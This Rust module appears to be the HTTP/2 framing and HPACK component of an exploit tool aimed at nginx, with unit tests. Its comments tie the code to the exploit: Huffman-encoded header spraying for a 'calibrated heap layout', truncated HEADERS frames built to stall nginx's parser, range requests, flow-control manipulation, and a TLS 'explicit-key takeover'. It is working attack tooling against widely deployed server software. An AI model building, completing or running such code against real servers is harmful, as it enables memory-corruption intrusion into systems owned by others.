//! Minimal HTTP/2 framing + HPACK encoder used by the exploit. The encoder is
//! deliberately small: it must emit exactly the reference bytes, not a
//! general-purpose header block.

use anyhow::{bail, Result};

pub const MAX_WINDOW: u32 = 0x7fff_ffff;
pub const HTTP2_MAX_FRAME_SIZE: u32 = 0x00ff_ffff;
pub const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

pub const DATA: u8 = 0;
pub const HEADERS: u8 = 1;
pub const RST_STREAM: u8 = 3;
pub const SETTINGS: u8 = 4;
pub const PING: u8 = 6;
pub const GOAWAY: u8 = 7;
pub const WINDOW_UPDATE: u8 = 8;
pub const CONTINUATION: u8 = 9;

pub const END_STREAM: u8 = 1;
pub const ACK: u8 = 1;
pub const END_HEADERS: u8 = 4;
pub const FLOW_CONTROL_ERROR: u32 = 3;
pub const CANCEL: u32 = 8;

pub fn frame(kind: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let length = payload.len();
    let mut out = Vec::with_capacity(9 + length);
    out.extend_from_slice(&[(length >> 16) as u8, (length >> 8) as u8, length as u8]);
    out.push(kind);
    out.push(flags);
    out.extend_from_slice(&stream.to_be_bytes());
    out.extend_from_slice(payload);
    out
}

pub fn hpack_integer(value: usize, prefix_bits: u8, mask: u8) -> Vec<u8> {
    let maximum = (1usize << prefix_bits) - 1;
    if value < maximum {
        return vec![mask | value as u8];
    }
    let mut out = vec![mask | maximum as u8];
    let mut value = value - maximum;
    while value >= 128 {
        out.push(((value & 127) as u8) | 128);
        value >>= 7;
    }
    out.push(value as u8);
    out
}

pub fn hpack_string(value: &[u8]) -> Vec<u8> {
    let mut out = hpack_integer(value.len(), 7, 0);
    out.extend_from_slice(value);
    out
}

pub enum Name<'a> {
    Index(usize),
    Text(&'a [u8]),
}

pub fn hpack_literal(name: Name<'_>, value: &[u8], indexed: bool) -> Vec<u8> {
    let (prefix_bits, mask) = if indexed { (6, 0x40) } else { (4, 0x00) };
    let mut out = match name {
        Name::Index(index) => hpack_integer(index, prefix_bits, mask),
        Name::Text(text) => {
            let mut out = vec![mask];
            out.extend_from_slice(&hpack_string(text));
            out
        }
    };
    out.extend_from_slice(&hpack_string(value));
    out
}

/// Encode a repeated Huffman symbol. Only `A` and `P` are needed by the
/// calibrated heap layout; both are supported in the reference encoder.
pub fn huffman_repeat(octet: u8, count: usize) -> Vec<u8> {
    let (code, width) = match octet {
        b'A' => (0x21u32, 6u32),
        b'P' => (0x6bu32, 7u32),
        _ => unreachable!("profile validation restricts Huffman symbols to A/P"),
    };
    let mut pending = 0u32;
    let mut bits = 0u32;
    let mut output = Vec::with_capacity((count * width as usize) / 8 + 1);
    for _ in 0..count {
        pending = (pending << width) | code;
        bits += width;
        while bits >= 8 {
            bits -= 8;
            output.push(((pending >> bits) & 0xff) as u8);
            pending &= (1 << bits) - 1;
        }
    }
    if bits > 0 {
        let pad = 1u32 << (8 - bits);
        output.push((((pending << (8 - bits)) | (pad - 1)) & 0xff) as u8);
    }
    let mut out = hpack_integer(output.len(), 7, 0x80);
    out.extend_from_slice(&output);
    out
}

/// Static-table indexes used by the exploit's request blocks.
pub const AUTHORITY: usize = 1;
pub const METHOD: usize = 2;
pub const PATH: usize = 4;
pub const RANGE: usize = 50;

pub fn request_block(authority: &[u8], path: &[u8], extra: &[u8]) -> Vec<u8> {
    let mut out = vec![0x82, 0x87]; // indexed :method GET, :scheme https
    out.extend_from_slice(&hpack_literal(Name::Index(AUTHORITY), authority, false));
    out.extend_from_slice(&hpack_literal(Name::Index(PATH), path, false));
    out.extend_from_slice(extra);
    out
}

pub fn head_request_block(authority: &[u8], path: &[u8]) -> Vec<u8> {
    let mut out = hpack_literal(Name::Index(METHOD), b"HEAD", false);
    out.push(0x87);
    out.extend_from_slice(&hpack_literal(Name::Index(AUTHORITY), authority, false));
    out.extend_from_slice(&hpack_literal(Name::Index(PATH), path, false));
    out
}

pub fn range_field(start: i64, end: Option<i64>) -> Vec<u8> {
    let value = match end {
        Some(end) => format!("bytes={start}-{end}"),
        None => format!("bytes={start}-"),
    };
    hpack_literal(Name::Index(RANGE), value.as_bytes(), false)
}

pub fn headers(stream_id: u32, block: &[u8], end_stream: bool) -> Vec<u8> {
    let flags = END_HEADERS | if end_stream { END_STREAM } else { 0 };
    frame(HEADERS, flags, stream_id, block)
}

pub fn partial_headers(stream_id: u32, complete_len: usize, prefix: &[u8]) -> Vec<u8> {
    let mut payload = prefix.to_vec();
    let mut out = Vec::with_capacity(9 + payload.len());
    out.extend_from_slice(&[
        (complete_len >> 16) as u8,
        (complete_len >> 8) as u8,
        complete_len as u8,
    ]);
    out.push(HEADERS);
    // The reference declares END_HEADERS even though the payload is truncated:
    // nginx then waits for the rest of this frame's payload, not a CONTINUATION.
    out.push(END_STREAM | END_HEADERS);
    out.extend_from_slice(&stream_id.to_be_bytes());
    out.append(&mut payload);
    out
}

/// Initial client SETTINGS used by every exploit connection: disable dynamic
/// table growth, keep the default 65,535 stream window, allow 16 MiB frames.
pub fn exploit_settings() -> Vec<u8> {
    let mut payload = Vec::with_capacity(18);
    payload.extend_from_slice(&1u16.to_be_bytes());
    payload.extend_from_slice(&0u32.to_be_bytes());
    payload.extend_from_slice(&4u16.to_be_bytes());
    payload.extend_from_slice(&65535u32.to_be_bytes());
    payload.extend_from_slice(&5u16.to_be_bytes());
    payload.extend_from_slice(&HTTP2_MAX_FRAME_SIZE.to_be_bytes());
    frame(SETTINGS, 0, 0, &payload)
}

pub fn settings_window(value: u32) -> Vec<u8> {
    let mut payload = vec![0x00, 0x04];
    payload.extend_from_slice(&value.to_be_bytes());
    frame(SETTINGS, 0, 0, &payload)
}

pub fn window_update(stream_id: u32, value: u32) -> Vec<u8> {
    frame(WINDOW_UPDATE, 0, stream_id, &value.to_be_bytes())
}

pub fn reset_stream(stream_id: u32) -> Vec<u8> {
    frame(RST_STREAM, 0, stream_id, &CANCEL.to_be_bytes())
}

pub fn range_request(
    stream_id: u32,
    authority: &[u8],
    path: &[u8],
    start: i64,
    end: Option<i64>,
    extra: &[u8],
) -> Vec<u8> {
    let mut block = request_block(authority, path, extra);
    block.extend_from_slice(&range_field(start, end));
    headers(stream_id, &block, true)
}

pub fn decode_hpack_integer(data: &[u8], offset: usize, prefix_bits: u8) -> Result<(usize, usize)> {
    let maximum = (1usize << prefix_bits) - 1;
    let mut value = (data[offset] as usize) & maximum;
    let mut offset = offset + 1;
    if value != maximum {
        return Ok((value, offset));
    }
    let mut shift = 0u32;
    while offset < data.len() {
        let octet = data[offset];
        offset += 1;
        value += ((octet & 127) as usize) << shift;
        if octet & 128 == 0 {
            return Ok((value, offset));
        }
        shift += 7;
        if shift > 56 {
            bail!("HPACK integer is too large");
        }
    }
    bail!("truncated HPACK integer")
}

/// One parsed frame, carrying only the fields the exploit consumes.
#[derive(Clone, Debug)]
pub struct FrameInfo {
    #[allow(dead_code)]
    pub stage: String,
    pub kind: u8,
    pub flags: u8,
    pub stream: u32,
    pub length: usize,
    pub error_code: Option<u32>,
    pub setting_pairs: Option<Vec<(u16, u32)>>,
    pub opaque: Option<Vec<u8>>,
    pub settings: Option<Vec<(u16, u32)>>,
}

#[derive(Clone, Debug, Default)]
pub struct Response {
    pub status: Option<String>,
    pub server_header: Option<String>,
    pub body: Vec<u8>,
}

/// Only the HPACK Huffman symbols needed to read nginx's status and banner.
fn huffman_symbol(code: u32, size: u32) -> Option<char> {
    let symbol = match (code, size) {
        (0, 5) => '0',
        (1, 5) => '1',
        (2, 5) => '2',
        (6, 5) => 'i',
        (23, 6) => '.',
        (24, 6) => '/',
        (25, 6) => '3',
        (26, 6) => '4',
        (27, 6) => '5',
        (28, 6) => '6',
        (29, 6) => '7',
        (30, 6) => '8',
        (31, 6) => '9',
        (38, 6) => 'g',
        (42, 6) => 'n',
        (121, 7) => 'x',
        _ => return None,
    };
    Some(symbol)
}

pub fn decode_hpack_text(data: &[u8], huffman: bool) -> Option<String> {
    if !huffman {
        return std::str::from_utf8(data).ok().map(|text| text.to_string());
    }
    let total_bits = data.len() as u32 * 8;
    let mut position = 0u32;
    let mut text = String::new();
    while total_bits - position >= 5 {
        let mut matched = false;
        for size in 5..=7u32 {
            if size > total_bits - position {
                break;
            }
            let mut code = 0u32;
            for bit in 0..size {
                let index = position + bit;
                let byte = data[(index / 8) as usize];
                code = (code << 1) | (((byte >> (7 - index % 8)) & 1) as u32);
            }
            if let Some(symbol) = huffman_symbol(code, size) {
                text.push(symbol);
                position += size;
                matched = true;
                break;
            }
        }
        if !matched {
            return None;
        }
    }
    if position < total_bits {
        for bit in position..total_bits {
            let byte = data[(bit / 8) as usize];
            if (byte >> (7 - bit % 8)) & 1 == 0 {
                return None;
            }
        }
    }
    Some(text)
}

fn skip_hpack_string(data: &[u8], offset: usize) -> Result<(&[u8], bool, usize)> {
    let (size, body) = decode_hpack_integer(data, offset, 7)?;
    if body + size > data.len() {
        bail!("truncated HPACK string");
    }
    let huffman = data[offset] & 0x80 != 0;
    Ok((&data[body..body + size], huffman, body + size))
}

/// Read the static-index status and the `server` value from a response block.
pub fn response_metadata(block: &[u8]) -> (Option<String>, Option<String>) {
    let mut status = None;
    let mut server = None;
    let mut offset = 0usize;
    while offset < block.len() {
        let octet = block[offset];
        if octet & 0x80 != 0 {
            let (index, next) = match decode_hpack_integer(block, offset, 7) {
                Ok(value) => value,
                Err(_) => break,
            };
            offset = next;
            status = status.or_else(|| status_text(index).map(str::to_string));
            continue;
        }
        let (name, next) = if octet & 0x40 != 0 {
            match decode_hpack_integer(block, offset, 6) {
                Ok(value) => value,
                Err(_) => break,
            }
        } else if octet & 0x20 != 0 {
            match decode_hpack_integer(block, offset, 5) {
                Ok((_, next)) => {
                    offset = next;
                    continue;
                }
                Err(_) => break,
            }
        } else {
            match decode_hpack_integer(block, offset, 4) {
                Ok(value) => value,
                Err(_) => break,
            }
        };
        offset = next;
        if name == 0 {
            match skip_hpack_string(block, offset) {
                Ok((_, _, next)) => offset = next,
                Err(_) => break,
            }
        }
        let (value, huffman, next) = match skip_hpack_string(block, offset) {
            Ok(value) => value,
            Err(_) => break,
        };
        offset = next;
        let text = decode_hpack_text(value, huffman);
        if let Some(text) = text {
            if let Some(indexed) = status_text(name) {
                let _ = indexed;
                status = Some(text);
            } else if name == 54 {
                server = Some(text);
            }
        }
    }
    (status, server)
}

fn status_text(index: usize) -> Option<&'static str> {
    Some(match index {
        8 => "200",
        9 => "204",
        10 => "206",
        11 => "304",
        12 => "400",
        13 => "404",
        14 => "500",
        _ => return None,
    })
}

pub struct Session<T: crate::tls::Transport> {
    pub transport: T,
    pub buffer: Vec<u8>,
    pub blocks: std::collections::HashMap<u32, Vec<u8>>,
    pub responses: std::collections::HashMap<u32, Response>,
    pub frames: Vec<FrameInfo>,
    pub settings: std::collections::HashMap<u16, u32>,
    pub end: Option<String>,
}

impl<T: crate::tls::Transport> Session<T> {
    pub fn new(transport: T) -> Self {
        Self {
            transport,
            buffer: Vec::new(),
            blocks: std::collections::HashMap::new(),
            responses: std::collections::HashMap::new(),
            frames: Vec::new(),
            settings: std::collections::HashMap::new(),
            end: None,
        }
    }

    pub fn is_open(&self) -> bool {
        self.end.is_none()
    }

    pub fn send(&mut self, plaintext: &[u8]) {
        if self.end.is_some() {
            return;
        }
        if let Err(error) = self.transport.send(plaintext) {
            self.end = Some(error.to_string());
        }
    }

    pub fn send_event(&mut self, plaintext: &[u8]) {
        if self.end.is_some() {
            return;
        }
        if let Err(error) = self.transport.send_event(plaintext) {
            self.end = Some(error.to_string());
        }
    }

    pub fn feed(&mut self, data: &[u8], label: &str) {
        self.buffer.extend_from_slice(data);
        self.parse(label);
    }

    fn parse(&mut self, label: &str) {
        use std::collections::hash_map::Entry;
        while self.buffer.len() >= 9 {
            let length =
                ((self.buffer[0] as usize) << 16) | ((self.buffer[1] as usize) << 8) | self.buffer[2] as usize;
            if self.buffer.len() < 9 + length {
                return;
            }
            let kind = self.buffer[3];
            let flags = self.buffer[4];
            let stream = u32::from_be_bytes([
                self.buffer[5],
                self.buffer[6],
                self.buffer[7],
                self.buffer[8],
            ]) & MAX_WINDOW;
            let mut payload = self.buffer[9..9 + length].to_vec();
            self.buffer.drain(..9 + length);

            let mut item = FrameInfo {
                stage: label.to_string(),
                kind,
                flags,
                stream,
                length,
                error_code: None,
                setting_pairs: None,
                opaque: None,
                settings: None,
            };
            match kind {
                SETTINGS if flags & ACK == 0 => {
                    if length % 6 != 0 {
                        self.end = Some("invalid SETTINGS".to_string());
                        return;
                    }
                    let mut pairs = Vec::with_capacity(length / 6);
                    for offset in (0..length).step_by(6) {
                        let id = u16::from_be_bytes([payload[offset], payload[offset + 1]]);
                        let value = u32::from_be_bytes([
                            payload[offset + 2],
                            payload[offset + 3],
                            payload[offset + 4],
                            payload[offset + 5],
                        ]);
                        pairs.push((id, value));
                        self.settings.insert(id, value);
                    }
                    item.setting_pairs = Some(pairs.clone());
                    item.settings = Some(pairs);
                    self.frames.push(item);
                    self.send(&frame(SETTINGS, ACK, 0, b""));
                    continue;
                }
                RST_STREAM if length == 4 => {
                    item.error_code =
                        Some(u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]));
                }
                PING => {
                    if stream != 0 || length != 8 {
                        self.end = Some("invalid PING".to_string());
                        return;
                    }
                    item.opaque = Some(payload.clone());
                }
                GOAWAY => {
                    if stream != 0 || length < 8 {
                        self.end = Some("invalid GOAWAY".to_string());
                        return;
                    }
                    let last_stream = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
                    let error_code =
                        u32::from_be_bytes([payload[4], payload[5], payload[6], payload[7]]);
                    item.error_code = Some(error_code);
                    let _ = last_stream;
                    self.frames.push(item);
                    self.end = Some(format!("GOAWAY({error_code})"));
                    return;
                }
                HEADERS | CONTINUATION => {
                    if kind == HEADERS {
                        if flags & 0x08 != 0 {
                            let padding = payload.first().copied().unwrap_or(0) as usize;
                            if padding > payload.len() {
                                self.end = Some("invalid padding".to_string());
                                return;
                            }
                            payload = payload[1..payload.len() - padding].to_vec();
                        }
                        if flags & 0x20 != 0 {
                            if payload.len() < 5 {
                                self.end = Some("invalid priority".to_string());
                                return;
                            }
                            payload = payload[5..].to_vec();
                        }
                    }
                    match self.blocks.entry(stream) {
                        Entry::Occupied(mut entry) => entry.get_mut().extend_from_slice(&payload),
                        Entry::Vacant(entry) => {
                            entry.insert(payload.clone());
                        }
                    }
                    if flags & END_HEADERS != 0 {
                        let block = self.blocks.remove(&stream).unwrap_or_default();
                        let (status, server) = response_metadata(&block);
                        let response = self.responses.entry(stream).or_default();
                        response.status = status;
                        response.server_header = server;
                    }
                }
                DATA => {
                    if flags & 0x08 != 0 {
                        let padding = payload.first().copied().unwrap_or(0) as usize;
                        if padding > payload.len() {
                            self.end = Some("invalid padding".to_string());
                            return;
                        }
                        payload = payload[1..payload.len() - padding].to_vec();
                    }
                    self.responses.entry(stream).or_default().body.extend_from_slice(&payload);
                }
                _ => {}
            }
            self.frames.push(item);
        }
    }

    pub fn receive_once(&mut self, label: &str, timeout: std::time::Duration) -> bool {
        self.transport.set_read_timeout(timeout);
        match self.transport.recv(16384) {
            Ok(data) => {
                if data.is_empty() {
                    self.end = Some("eof".to_string());
                    return false;
                }
                self.feed(&data, label);
                if self.transport.take_openssl_write() {
                    self.end = Some("OpenSSL wrote after explicit-key takeover".to_string());
                }
                true
            }
            Err(error)
                if matches!(
                    error.kind(),
                    std::io::ErrorKind::TimedOut | std::io::ErrorKind::WouldBlock
                ) =>
            {
                false
            }
            Err(error) => {
                self.end = Some(error.to_string());
                false
            }
        }
    }

    /// Receive until the socket is briefly idle or the connection ends.
    pub fn drain(&mut self, label: &str, timeout: std::time::Duration) {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(2);
        while self.is_open() && std::time::Instant::now() < deadline {
            if !self.receive_once(label, timeout) {
                return;
            }
        }
    }

    pub fn wait_for<F>(
        &mut self,
        predicate: F,
        label: &str,
        timeout: std::time::Duration,
        interval: std::time::Duration,
    ) -> Result<()>
    where
        F: Fn(&Self) -> bool,
    {
        let deadline = std::time::Instant::now() + timeout;
        while self.is_open() && std::time::Instant::now() < deadline {
            self.drain(label, interval);
            if predicate(self) {
                return Ok(());
            }
        }
        bail!("{label} failed; connection={:?}", self.end)
    }

    pub fn wait_for_immediate<F>(
        &mut self,
        predicate: F,
        label: &str,
        timeout: std::time::Duration,
        interval: std::time::Duration,
    ) -> Result<()>
    where
        F: Fn(&Self) -> bool,
    {
        let deadline = std::time::Instant::now() + timeout;
        while self.is_open() && std::time::Instant::now() < deadline {
            if predicate(self) {
                return Ok(());
            }
            let remaining = deadline.saturating_duration_since(std::time::Instant::now());
            let step = if remaining < interval { remaining } else { interval };
            if step.is_zero() {
                break;
            }
            self.receive_once(label, step);
        }
        bail!("{label} failed; connection={:?}", self.end)
    }

    pub fn received_ping_ack(&self, before: usize, token: &[u8]) -> bool {
        self.frames[before..].iter().any(|item| {
            item.kind == PING
                && item.flags & ACK != 0
                && item.opaque.as_deref() == Some(token)
        })
    }

    pub fn close(&mut self) {
        self.transport.close();
    }
}


#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hpack_integer_continuation() {
        assert_eq!(hpack_integer(1337, 5, 0), vec![0x1f, 0x9a, 0x0a]);
        assert_eq!(hpack_integer(10, 5, 0), vec![0x0a]);
        assert_eq!(decode_hpack_integer(&[0x1f, 0x9a, 0x0a], 0, 5).unwrap(), (1337, 3));
    }

    #[test]
    fn request_block_matches_reference_bytes() {
        assert_eq!(
            request_block(b"h", b"/i", b""),
            b"\x82\x87\x01\x01h\x04\x02/i".to_vec()
        );
        assert_eq!(
            hpack_literal(Name::Index(RANGE), b"bytes=0-0", false),
            b"\x0f\x23\x09bytes=0-0".to_vec()
        );
    }

    #[test]
    fn huffman_repeat_known_bytes() {
        assert_eq!(
            huffman_repeat(b'A', 8),
            vec![0x86, 0x86, 0x18, 0x61, 0x86, 0x18, 0x61]
        );
    }

    #[test]
    fn frame_and_headers_layout() {
        let f = frame(HEADERS, END_HEADERS | END_STREAM, 3, b"ab");
        assert_eq!(f, vec![0x00, 0x00, 0x02, 0x01, 0x05, 0, 0, 0, 3, b'a', b'b']);
        let p = partial_headers(5, 100, b"xy");
        assert_eq!(p[..5], [0x00, 0x00, 0x64, 0x01, 0x05]);
        assert_eq!(&p[5..9], &5u32.to_be_bytes());
        assert_eq!(&p[9..], b"xy");
    }

    #[test]
    fn range_and_settings_bytes() {
        assert_eq!(settings_window(65535), vec![0, 0, 6, 4, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0xff, 0xff]);
        assert_eq!(window_update(0, 1), vec![0, 0, 4, 8, 0, 0, 0, 0, 0, 0, 0, 0, 1]);
        assert_eq!(reset_stream(7), vec![0, 0, 4, 3, 0, 0, 0, 0, 7, 0, 0, 0, 8]);
        let r = range_field(0, Some(9));
        assert_eq!(r, b"\x0f\x23\x09bytes=0-9".to_vec());
    }
}

#[cfg(test)]
mod parser_tests {
    use super::*;
    use std::collections::VecDeque;
    use std::io;
    use std::time::Duration;

    struct Fake {
        chunks: VecDeque<Vec<u8>>,
        pub sent: Vec<Vec<u8>>,
    }

    impl Fake {
        fn new(bytes: Vec<u8>) -> Self {
            Self { chunks: VecDeque::from([bytes]), sent: Vec::new() }
        }
    }

    impl crate::tls::Transport for Fake {
        fn recv(&mut self, _max: usize) -> io::Result<Vec<u8>> {
            match self.chunks.pop_front() {
                Some(chunk) => Ok(chunk),
                None => Err(io::Error::new(io::ErrorKind::WouldBlock, "empty")),
            }
        }
        fn send(&mut self, plaintext: &[u8]) -> io::Result<()> {
            self.sent.push(plaintext.to_vec());
            Ok(())
        }
        fn send_event(&mut self, plaintext: &[u8]) -> io::Result<()> {
            self.sent.push(plaintext.to_vec());
            Ok(())
        }
        fn set_read_timeout(&mut self, _timeout: Duration) {}
        fn set_backpressure_window(&mut self, _bytes: i32) -> io::Result<()> {
            Ok(())
        }
        fn close(&mut self) {}
    }

    fn settings_payload(pairs: &[(u16, u32)]) -> Vec<u8> {
        let mut payload = Vec::new();
        for (id, value) in pairs {
            payload.extend_from_slice(&id.to_be_bytes());
            payload.extend_from_slice(&value.to_be_bytes());
        }
        frame(SETTINGS, 0, 0, &payload)
    }

    #[test]
    fn parses_server_control_and_response_frames() {
        let block = {
            let mut block = vec![0x88]; // indexed :status 200
            block.extend_from_slice(&hpack_literal(Name::Index(54), b"nginx/1.31.8", false));
            block
        };
        let mut stream = Vec::new();
        stream.extend(settings_payload(&[(3, 128), (4, 65536)]));
        stream.extend(frame(PING, ACK, 0, b"abcdefgh"));
        stream.extend(frame(RST_STREAM, 0, 3, &FLOW_CONTROL_ERROR.to_be_bytes()));
        stream.extend(headers(1, &block, true));
        stream.extend(frame(DATA, END_STREAM, 1, b"hello"));

        let mut session = Session::new(Fake::new(stream));
        session.drain("test", Duration::from_millis(20));

        assert_eq!(session.settings.get(&3), Some(&128));
        assert_eq!(session.settings.get(&4), Some(&65536));
        // The parser must ACK the server SETTINGS exactly once.
        let expected_ack = frame(SETTINGS, ACK, 0, b"");
        assert_eq!(session.transport.sent, vec![expected_ack]);
        assert_eq!(session.frames.iter().filter(|f| f.kind == PING).count(), 1);
        let rst = session.frames.iter().find(|f| f.kind == RST_STREAM).unwrap();
        assert_eq!(rst.error_code, Some(FLOW_CONTROL_ERROR));
        let response = &session.responses[&1];
        assert_eq!(response.status.as_deref(), Some("200"));
        assert_eq!(response.server_header.as_deref(), Some("nginx/1.31.8"));
        assert_eq!(response.body, b"hello");
        assert!(session.end.is_none());
    }

    #[test]
    fn decodes_limited_huffman_server_value() {
        let bytes = hex::decode("aa6355e580aec8577b").unwrap();
        assert_eq!(decode_hpack_text(&bytes, true).as_deref(), Some("nginx/1.31.8"));
    }

    #[test]
    fn goaway_ends_session() {
        let mut payload = 1u32.to_be_bytes().to_vec();
        payload.extend_from_slice(&0u32.to_be_bytes());
        let mut session = Session::new(Fake::new(frame(GOAWAY, 0, 0, &payload)));
        session.drain("test", Duration::from_millis(20));
        assert_eq!(session.end.as_deref(), Some("GOAWAY(0)"));
    }
}

